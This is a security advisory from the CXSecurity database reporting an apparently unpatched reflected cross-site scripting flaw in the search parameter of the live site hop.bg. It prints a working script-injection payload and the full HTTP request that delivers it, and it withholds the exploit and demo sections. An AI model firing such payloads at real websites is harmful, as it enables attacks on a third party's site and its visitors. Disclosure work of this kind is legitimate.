---
title: hop.bg | web app | Cross-site scripting (reflected)
url: https://cxsecurity.com/issue/WLB-2025110008
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-11-07
fetch_date: 2025-11-08T03:01:25.403797
---

# hop.bg | web app | Cross-site scripting (reflected)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **hop.bg | web app | Cross-site scripting (reflected)**  **2025.11.07**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

## Titles: hop.bg | web app | Cross-site scripting (reflected)
## Author: nu11secur1ty
## Date: 11/03/2025
## Vendor: https://hop.bg/
## Software: https://hop.bg/
## Reference: https://portswigger.net/web-security/cross-site-scripting
## Description:
The value of the `srch` request parameter is copied into a JavaScript string which is encapsulated in single quotation marks. The payload lifmu</script><script>alert(1)</script>nkt8b was submitted in the `srch` parameter. This input was echoed unmodified in the application's response. The owner of this web app is not responding to the already reported problem.
This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.
STATUS: HIGH- Vulnerability
[+]Payload:
```
GET /bg/tyrsene-123?p=123&l=1&srch=gq7ns%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3ein737&submit\_search= HTTP/1.1
Host: hop.bg
Cache-Control: max-age=0
Sec-CH-UA: "Chromium";v="141", "Not;A=Brand";v="24", "Google Chrome";v="141"
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: "Windows"
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: Public=3l4neblt0r1q8tl8r1j8vm1kg2; l=1; \_gcl\_au=1.1.1810943222.1761893757; \_fbp=fb.1.1761893757009.110679894202803572; \_tt\_enable\_cookie=1; \_ttp=01K8WGTCHG0MT2MTV43EPDVPSH\_.tt.1; \_uetsid=a6fe2700b62611f0ba2e15757049e30e; \_uetvid=a6fe6880b62611f0a84c27f8eba50d96; ttcsid=1761893757500::mkwLVMcL6Tixw1dD6Twz.1.1761893767648.0; ttcsid\_D0S5A7RC77U1EAH3MNBG=1761893757499::8I3zM\_RSsJeOcW0e8fgM.1.1761893767648.0
Upgrade-Insecure-Requests: 1
Referer: https://hop.bg/
```
[+]Exploit:
```
Not showing for security reasons
```
## Reproduce:
[href]("Not showing for security reasons")
## Demo PoC:
[href](Not showing for security reasons)
## Time spent:
01:27:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
home page: https://www.nu11secur1ty.com/ and https://www.asc3t1c-nu11secur1ty.com/
nu11secur1ty <https://nu11secur1ty.blogspot.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025110008)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top